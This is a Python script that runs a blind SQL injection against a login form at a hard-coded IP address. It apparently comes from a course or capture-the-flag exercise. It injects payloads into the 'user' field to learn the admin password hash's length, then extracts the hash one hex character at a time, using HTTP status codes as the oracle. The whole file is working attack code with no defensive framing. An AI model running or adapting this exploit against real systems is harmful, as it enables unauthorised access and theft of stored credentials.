import requests
import base64
import string


target = "http://54.251.213.12"

charset = 'abcdef' + string.digits

hashLength = 0

for i in range(1, 64):
    data = {
        "user" : f"admin' and length(password)={i} #",
        "password" : "IFS4103_GROUP1",
        "authType" : base64.b64encode('ADi'.encode()).decode(),
        "submit" : ""
    }

    r = requests.post(target + "/login", data=data)

    # print(r.text)
    if "Warning" not in r.text:
        hashLength = i
        print("Length of password hash is", i)
        break


hash = ""
for i in range(len(hash), hashLength):
    for hex in charset:
        print("Testing", hash + hex)
        data = {
            "user" : f"admin' and (select substring(password, {i+1}, 1) from users where user='admin')='{hex}' #",
            "password" : "IFS4103_GROUP1",
            "authType" : base64.b64encode('ADi'.encode()).decode(),
            "submit" : ""
        }

        r = requests.post(target + "/login", data=data)

        # 500 for false condition, 200 for true condition. 
        # print(r.status_code)
        if r.status_code == 200:
            hash += hex
            print("Found! Uncompleted token:", hash)
            break

print("Hash length is", hashLength)
print("Password hash is", hash)